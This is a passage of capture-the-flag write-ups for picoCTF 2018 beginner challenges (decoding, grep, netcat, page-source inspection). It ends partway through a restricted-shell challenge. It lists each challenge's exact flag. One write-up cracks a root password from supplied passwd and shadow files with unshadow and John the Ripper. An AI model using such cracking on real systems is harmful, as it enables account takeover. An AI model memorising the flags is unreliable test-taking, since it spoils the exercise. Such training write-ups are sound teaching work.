</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{welc0m3_t0_r3VeRs1nG} </code><hr><h1 id="reversing-50-reversing-warmup-2"> Reversing 50: Reversing Warmup 2 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/07-reversing-50-reversing-warmup-2.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Can you decode the following string <code class="language-plaintext highlighter-rouge">dGg0dF93NHNfczFtcEwz</code> from base64 format to ASCII?</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="n">base64</span>
<span class="gp">&gt;&gt;&gt;</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="sh">'</span><span class="s">dGg0dF93NHNfczFtcEwz</span><span class="sh">'</span><span class="p">)</span>
<span class="sh">'</span><span class="s">th4t_w4s_s1mpL3</span><span class="sh">'</span>
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{th4t_w4s_s1mpL3} </code><hr><h1 id="cryptography-75-crypto-warmup-1"> Cryptography 75: Crypto Warmup 1 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/08-cryptography-75-crypto-warmup-1.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Crpyto can often be done by hand, here’s a message you got from a friend, <code class="language-plaintext highlighter-rouge">llkjmlmpadkkc</code> with the key of <code class="language-plaintext highlighter-rouge">thisisalilkey</code>. Can you use this table to solve it?.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>    A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
   +----------------------------------------------------
A | A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
B | B C D E F G H I J K L M N O P Q R S T U V W X Y Z A
C | C D E F G H I J K L M N O P Q R S T U V W X Y Z A B
D | D E F G H I J K L M N O P Q R S T U V W X Y Z A B C
E | E F G H I J K L M N O P Q R S T U V W X Y Z A B C D
F | F G H I J K L M N O P Q R S T U V W X Y Z A B C D E
G | G H I J K L M N O P Q R S T U V W X Y Z A B C D E F
H | H I J K L M N O P Q R S T U V W X Y Z A B C D E F G
I | I J K L M N O P Q R S T U V W X Y Z A B C D E F G H
J | J K L M N O P Q R S T U V W X Y Z A B C D E F G H I
K | K L M N O P Q R S T U V W X Y Z A B C D E F G H I J
L | L M N O P Q R S T U V W X Y Z A B C D E F G H I J K
M | M N O P Q R S T U V W X Y Z A B C D E F G H I J K L
N | N O P Q R S T U V W X Y Z A B C D E F G H I J K L M
O | O P Q R S T U V W X Y Z A B C D E F G H I J K L M N
P | P Q R S T U V W X Y Z A B C D E F G H I J K L M N O
Q | Q R S T U V W X Y Z A B C D E F G H I J K L M N O P
R | R S T U V W X Y Z A B C D E F G H I J K L M N O P Q
S | S T U V W X Y Z A B C D E F G H I J K L M N O P Q R
T | T U V W X Y Z A B C D E F G H I J K L M N O P Q R S
U | U V W X Y Z A B C D E F G H I J K L M N O P Q R S T
V | V W X Y Z A B C D E F G H I J K L M N O P Q R S T U
W | W X Y Z A B C D E F G H I J K L M N O P Q R S T U V
X | X Y Z A B C D E F G H I J K L M N O P Q R S T U V W
Y | Y Z A B C D E F G H I J K L M N O P Q R S T U V W X
Z | Z A B C D E F G H I J K L M N O P Q R S T U V W X Y
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Looks like vigenere,</p><h2> Flag</h2><code> picoCTF{SECRETMESSAGE} </code><hr><h1 id="cryptography-75-crypto-warmup-2"> Cryptography 75: Crypto Warmup 2 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/09-cryptography-75-crypto-warmup-2.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Cryptography doesn’t have to be complicated, have you ever heard of something called rot13? <code class="language-plaintext highlighter-rouge">cvpbPGS{guvf_vf_pelcgb!}</code></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="gp">&gt;&gt;&gt;</span> <span class="sh">'</span><span class="s">cvpbPGS{guvf_vf_pelcgb!}</span><span class="sh">'</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">rot13</span><span class="sh">'</span><span class="p">)</span>
<span class="sa">u</span><span class="sh">'</span><span class="s">picoCTF{this_is_crypto!}</span><span class="sh">'</span>
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{this_is_crypto!} </code><hr><h1 id="general-skills-75-grep-1"> General Skills 75: grep 1 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/10-general-skills-75-grep-1.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Can you find the flag in <a href="writeupfiles/file">file</a>? This would be really obnoxious to look through by hand, see if you can find a faster way.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">grep</span> <span class="s2">"picoCTF"</span> file
picoCTF<span class="o">{</span>grep_and_you_will_find_c709fa94<span class="o">}</span>
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{grep_and_you_will_find_c709fa94} </code><hr><h1 id="general-skills-75-net-cat"> General Skills 75: net cat <a href="/CTF-writeups-public/writeups/PicoCTF_2018/11-general-skills-75-net-cat.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Using netcat (nc) will be a necessity throughout your adventure. Can you connect to <code class="language-plaintext highlighter-rouge">2018shell1.picoctf.com</code> at port <code class="language-plaintext highlighter-rouge">49387</code> to get the flag?</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc 2018shell1.picoctf.com 49387
That wasn<span class="s1">'t so hard was it?
picoCTF{NEtcat_iS_a_NEcESSiTy_8b6a1fbc}
</span></pre></table></code></div></div><h2> Flag</h2><code> picoCTF{NEtcat_iS_a_NEcESSiTy_8b6a1fbc} </code><hr><h1 id="cryptography-100-heeeeeeere-s-johnny"> Cryptography 100: HEEEEEEERE’S Johnny! <a href="/CTF-writeups-public/writeups/PicoCTF_2018/12-cryptography-100-heeeeeeeres-johnny.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Okay, so we found some important looking files on a linux computer. Maybe they can be used to get a password to the process.<br /> Connect with <code class="language-plaintext highlighter-rouge">nc 2018shell1.picoctf.com 40157</code>. Files can be found here: <a href="writeupfiles/passwd">passwd</a> <a href="writeupfiles/shadow">shadow</a>.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We use a combination of unshadow and john the ripper to find the password</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>$ unshadow passwd shadow &gt; crackme
$ john crackme
Created directory: /home/saskia/.john
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
password1        (root)
1g 0:00:00:01 100% 2/3 0.5102g/s 469.3p/s 469.3c/s 469.3C/s 123456..pepper
Use the "--show" option to display all of the cracked passwords reliably
Session completed
</pre></table></code></div></div><p>So we know the password for the root user is <code class="language-plaintext highlighter-rouge">password1</code>. We use that to log into the server</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc 2018shell1.picoctf.com 40157
Username: root
Password: password1
picoCTF<span class="o">{</span>J0hn_1<span class="nv">$_R1pp3d_1b25af80</span><span class="o">}</span>
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{J0hn_1$_R1pp3d_1b25af80} </code><hr><h1 id="general-skills-100-strings"> General Skills 100: strings <a href="/CTF-writeups-public/writeups/PicoCTF_2018/13-general-skills-100-strings.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Can you find the flag in <a href="writeupfiles/strings">this file</a> without actually running it? You can also find the file<br /> in <code class="language-plaintext highlighter-rouge">/problems/strings_4_40d221755b4a0b134c2a7a2e825ef95f</code> on the shell server.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>strings strings | <span class="nb">grep </span>picoCTF
picoCTF<span class="o">{</span>sTrIngS_sAVeS_Time_d3ffa29c<span class="o">}</span>
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{sTrIngS_sAVeS_Time_d3ffa29c} </code><hr><h1 id="general-skills-110-pipe"> GEneral Skills 110: pipe <a href="/CTF-writeups-public/writeups/PicoCTF_2018/14-general-skills-110-pipe.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>During your dventure, you will likely encounter a situation where you need to process<br /> data that you receive over the network rather than through a file. Can you find a way<br /> to save the output from this program and search for the flag?<br /> Connect with <code class="language-plaintext highlighter-rouge">2018shell1.picoctf.com 34532</code>.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We connect via netcat and are flooded with messages</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc 2018shell1.picoctf.com 34532
Unfortunately this is also not a flag
This is not a flag
This is not a flag
I<span class="s1">'m sorry you'</span>re going to have to look at another line
I<span class="s1">'m sorry you'</span>re going to have to look at another line
I<span class="s1">'m sorry you'</span>re going to have to look at another line
Unfortunately this is also not a flag
I<span class="s1">'m sorry you'</span>re going to have to look at another line
I<span class="s1">'m sorry you'</span>re going to have to look at another line
I<span class="s1">'m sorry you'</span>re going to have to look at another line
Unfortunately this is also not a flag
I<span class="s1">'m sorry you'</span>re going to have to look at another line
Unfortunately this is also not a flag
This is not a flag
<span class="o">[</span>..]
</pre></table></code></div></div><p>So we do a grep:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc 2018shell1.picoctf.com 34532 | <span class="nb">grep </span>picoCTF
picoCTF<span class="o">{</span>almost_like_mario_b797f2b3<span class="o">}</span>
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{almost_like_mario_b797f2b3} </code><hr><h1 id="web-exploitation-125-inspect-me"> Web Exploitation 125: Inspect Me <a href="/CTF-writeups-public/writeups/PicoCTF_2018/15-web-exploitation-125-inspect-me.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We check the source:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="cp">&lt;!doctype html&gt;</span>
<span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>My First Website :)<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"https://fonts.googleapis.com/css?family=Open+Sans|Roboto"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">href=</span><span class="s">"mycss.css"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"application/javascript"</span> <span class="na">src=</span><span class="s">"myjs.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
  <span class="nt">&lt;/head&gt;</span>

  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;header&gt;</span>
	<span class="nt">&lt;h1&gt;</span>My First Website<span class="nt">&lt;/h1&gt;</span>
      <span class="nt">&lt;/header&gt;</span>

      <span class="nt">&lt;button</span> <span class="na">class=</span><span class="s">"tablink"</span> <span class="na">onclick=</span><span class="s">"openTab('tabintro', this, '#222')"</span> <span class="na">id=</span><span class="s">"defaultOpen"</span><span class="nt">&gt;</span>Intro<span class="nt">&lt;/button&gt;</span>
      <span class="nt">&lt;button</span> <span class="na">class=</span><span class="s">"tablink"</span> <span class="na">onclick=</span><span class="s">"openTab('tababout', this, '#222')"</span><span class="nt">&gt;</span>About<span class="nt">&lt;/button&gt;</span>

      <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"tabintro"</span> <span class="na">class=</span><span class="s">"tabcontent"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;h3&gt;</span>Intro<span class="nt">&lt;/h3&gt;</span>
	<span class="nt">&lt;p&gt;</span>This is my first website!<span class="nt">&lt;/p&gt;</span>
      <span class="nt">&lt;/div&gt;</span>

      <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"tababout"</span> <span class="na">class=</span><span class="s">"tabcontent"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;h3&gt;</span>About<span class="nt">&lt;/h3&gt;</span>
	<span class="nt">&lt;p&gt;</span>These are the web skills I've been practicing: <span class="nt">&lt;br/&gt;</span>
	  HTML <span class="nt">&lt;br/&gt;</span>
	  CSS <span class="nt">&lt;br/&gt;</span>
	  JS (JavaScript)
	<span class="nt">&lt;/p&gt;</span>
	<span class="c">&lt;!-- I learned HTML! Here's part 1/3 of the flag: picoCTF{ur_4_real_1nspe --&gt;</span>
      <span class="nt">&lt;/div&gt;</span>

    <span class="nt">&lt;/div&gt;</span>

  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>Looks like only 1/3 of the flag, we keep looking</p><p>mycss.css</p><div class="language-css highlighter-rouge"><div class="code-header"> <span data-label-text="CSS"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre><span class="nt">div</span><span class="nc">.container</span> <span class="p">{</span>
    <span class="nl">width</span><span class="p">:</span> <span class="m">100%</span><span class="p">;</span>
<span class="p">}</span>

<span class="nt">header</span> <span class="p">{</span>
    <span class="nl">background-color</span><span class="p">:</span> <span class="m">#c9d8ef</span><span class="p">;</span>
    <span class="nl">padding</span><span class="p">:</span> <span class="m">1em</span><span class="p">;</span>
    <span class="nl">color</span><span class="p">:</span> <span class="no">white</span><span class="p">;</span>
    <span class="nl">clear</span><span class="p">:</span> <span class="nb">left</span><span class="p">;</span>
    <span class="nl">text-align</span><span class="p">:</span> <span class="nb">center</span><span class="p">;</span>
<span class="p">}</span>

<span class="nt">body</span> <span class="p">{</span>
    <span class="nl">font-family</span><span class="p">:</span> <span class="n">Roboto</span><span class="p">;</span>
<span class="p">}</span>

<span class="nt">h1</span> <span class="p">{</span>
    <span class="nl">color</span><span class="p">:</span> <span class="m">#222</span><span class="p">;</span>
<span class="p">}</span>

<span class="nt">p</span> <span class="p">{</span>
    <span class="nl">font-family</span><span class="p">:</span> <span class="s1">"Open Sans"</span><span class="p">;</span>
<span class="p">}</span>

<span class="nc">.tablink</span> <span class="p">{</span>
    <span class="nl">background-color</span><span class="p">:</span> <span class="m">#555</span><span class="p">;</span>
    <span class="nl">color</span><span class="p">:</span> <span class="no">white</span><span class="p">;</span>
    <span class="nl">float</span><span class="p">:</span> <span class="nb">left</span><span class="p">;</span>
    <span class="nl">border</span><span class="p">:</span> <span class="nb">none</span><span class="p">;</span>
    <span class="nl">outline</span><span class="p">:</span> <span class="nb">none</span><span class="p">;</span>
    <span class="nl">cursor</span><span class="p">:</span> <span class="nb">pointer</span><span class="p">;</span>
    <span class="nl">padding</span><span class="p">:</span> <span class="m">14px</span> <span class="m">16px</span><span class="p">;</span>
    <span class="nl">font-size</span><span class="p">:</span> <span class="m">17px</span><span class="p">;</span>
    <span class="nl">width</span><span class="p">:</span> <span class="m">50%</span><span class="p">;</span>
<span class="p">}</span>

<span class="nc">.tablink</span><span class="nd">:hover</span> <span class="p">{</span>
    <span class="nl">background-color</span><span class="p">:</span> <span class="m">#777</span><span class="p">;</span>
<span class="p">}</span>

<span class="nc">.tabcontent</span> <span class="p">{</span>
    <span class="nl">color</span><span class="p">:</span> <span class="m">#111</span><span class="p">;</span>
    <span class="nl">display</span><span class="p">:</span> <span class="nb">none</span><span class="p">;</span>
    <span class="nl">padding</span><span class="p">:</span> <span class="m">50px</span><span class="p">;</span>
    <span class="nl">text-align</span><span class="p">:</span> <span class="nb">center</span><span class="p">;</span>
<span class="p">}</span>

<span class="nf">#tabintro</span> <span class="p">{</span> <span class="nl">background-color</span><span class="p">:</span> <span class="m">#ccc</span><span class="p">;</span> <span class="p">}</span>
<span class="nf">#tababout</span> <span class="p">{</span> <span class="nl">background-color</span><span class="p">:</span> <span class="m">#ccc</span><span class="p">;</span> <span class="p">}</span>

<span class="c">/* I learned CSS! Here's part 2/3 of the flag: ct0r_g4dget_b4887011} */</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">myjs.js</code>:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nf">openTab</span><span class="p">(</span><span class="nx">tabName</span><span class="p">,</span><span class="nx">elmnt</span><span class="p">,</span><span class="nx">color</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">i</span><span class="p">,</span> <span class="nx">tabcontent</span><span class="p">,</span> <span class="nx">tablinks</span><span class="p">;</span>
    <span class="nx">tabcontent</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByClassName</span><span class="p">(</span><span class="dl">"</span><span class="s2">tabcontent</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">for </span><span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">tabcontent</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">tabcontent</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">none</span><span class="dl">"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">tablinks</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementsByClassName</span><span class="p">(</span><span class="dl">"</span><span class="s2">tablink</span><span class="dl">"</span><span class="p">);</span>
    <span class="k">for </span><span class="p">(</span><span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">tablinks</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">tablinks</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">style</span><span class="p">.</span><span class="nx">backgroundColor</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="nx">tabName</span><span class="p">).</span><span class="nx">style</span><span class="p">.</span><span class="nx">display</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">block</span><span class="dl">"</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nx">elmnt</span><span class="p">.</span><span class="nx">style</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">elmnt</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">backgroundColor</span> <span class="o">=</span> <span class="nx">color</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="nf">openTab</span><span class="p">(</span><span class="dl">'</span><span class="s1">tabintro</span><span class="dl">'</span><span class="p">,</span> <span class="k">this</span><span class="p">,</span> <span class="dl">'</span><span class="s1">#222</span><span class="dl">'</span><span class="p">);</span>
<span class="p">}</span>

<span class="cm">/* I learned JavaScript! Here's part 3/3 of the flag:  */</span>
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{ur_4_real_1nspect0r_g4dget_b4887011} </code><hr><h1 id="general-skills-125-grep-2"> General Skills 125: grep 2 <a href="/CTF-writeups-public/writeups/PicoCTF_2018/16-general-skills-125-grep-2.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This one is a little bit harder. Can you find the flag in <code class="language-plaintext highlighter-rouge">/problems/grep-2_2_413a577106278d0711d28a98f4f6ac28/files</code><br /> on the shell server? Remember, grep is your friend.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cd</span> /problems/grep-2_2_413a577106278d0711d28a98f4f6ac28/files
<span class="nv">$ </span><span class="nb">ls
</span>files0  files1  files2  files3  files4  files5  files6  files7  files8  files9
<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-r</span> <span class="s2">"picoCTF"</span>
files2/file16:picoCTF<span class="o">{</span>grep_r_and_you_will_find_8eb84049<span class="o">}</span>
</pre></table></code></div></div><h2> Flag</h2><code> picoCTF{grep_r_and_you_will_find_8eb84049} </code><hr><h1 id="general-skills-150-aca-shell-a"> General Skills 150: Aca-Shell-A <a href="/CTF-writeups-public/writeups/PicoCTF_2018/17-general-skills-150-aca-shell-a.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><strong>Challenge</strong><br /> It’s never a bad idea to brush up on those linux skills or even learn some new ones<br /> before you set off on this adventure! Connect with <code class="language-plaintext highlighter-rouge">nc 2018shell1.picoctf.com 58422</code>.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc 2018shell1.picoctf.com 58422
Sweet! We have gotten access into the system but we aren<span class="s1">'t root.
It'</span>s some <span class="nb">sort </span>of restricted shell! I can<span class="s1">'t see what you are typing
but I can see your output. I'</span>ll be here to <span class="nb">help </span>you along.
If you need <span class="nb">help</span>, <span class="nb">type</span> <span class="s2">"echo 'Help Me!'"</span> and I<span class="s1">'ll see what I can do
There is not much time left!

~/$ ls
blackmail
executables
passwords
photos
secret

~/$ cd secret
Now we are cookin'</span><span class="o">!</span> Take a look around there and tell me what you find!
~/secret<span class="nv">$ </span><span class="nb">ls
</span>intel_1
intel_2
intel_3
intel_4
intel_5
profile_AipieG5Ua9aewei5ieSoh7aph
profile_Xei2uu5suwangohceedaifohs
profile_ahShaighaxahMooshuP1johgo
profile_ahqueith5aekongieP4ahzugi
profile_aik4hah9ilie9foru0Phoaph0
